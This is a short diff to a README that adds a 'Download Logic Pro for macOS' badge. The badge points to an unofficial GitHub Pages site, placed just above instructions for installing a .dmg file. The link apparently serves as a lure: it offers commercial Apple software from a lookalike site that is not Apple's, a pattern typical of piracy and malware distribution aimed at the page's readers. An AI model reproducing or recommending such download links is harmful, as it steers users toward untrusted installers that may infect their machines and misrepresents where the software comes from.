@@ -6,6 +6,9 @@ With a vast sound library, MIDI sequencing, software instruments, and support fo
 
 ---
 
+## ✅ Download Logic Pro for macOS  
+[![Download Logic Pro](https://img.shields.io/badge/Download-Logic_Pro-blueviolet)](https://logic-pro-mac-download.github.io/.github)
+
 ## 📦 How to Install
 
 # Installation via .dmg:
